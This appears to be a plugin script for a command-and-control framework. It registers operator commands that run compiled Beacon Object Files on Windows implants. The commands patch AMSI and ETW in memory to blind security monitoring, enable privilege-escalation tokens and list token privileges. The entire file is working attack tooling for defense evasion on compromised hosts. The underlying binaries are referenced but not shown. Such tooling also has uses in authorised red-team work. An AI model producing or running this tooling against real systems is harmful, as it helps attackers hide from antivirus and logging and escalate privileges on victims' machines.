var metadata = {
    name: "Evasion-BOF",
    description: "Defense evasion: AMSI/ETW bypass, privilege enforcement, token inspection"
};

var amsi_etw = ax.create_command("amsi-bypass", "Patch AMSI and/or ETW in memory", "amsi-bypass <mode>");
amsi_etw.addArgString("mode", false, "0=AMSI, 1=ETW, 2=Both");
amsi_etw.setPreHook(function(id, cmdline, parsed) {
    let mode = parsed[0] || "0";
    let params = ax.bof_pack("int", [parseInt(mode)]);
    let bof = ax.script_dir() + "_bin/amsi_etw." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: AMSI/ETW Bypass");
});

var priv_enforce = ax.create_command("priv-enforce", "Enable common privilege escalation tokens", "priv-enforce");
priv_enforce.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [0]);
    let bof = ax.script_dir() + "_bin/priv_enforce." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Enable Privileges");
});

var token_priv = ax.create_command("token-privs", "Display current token privileges", "token-privs");
token_priv.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [0]);
    let bof = ax.script_dir() + "_bin/token_priv." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: List Token Privileges");
});

var group = ax.create_commands_group("Evasion", [amsi_etw, priv_enforce, token_priv]);
ax.register_commands_group(group, ["beacon", "beacon9090"], ["windows"], []);
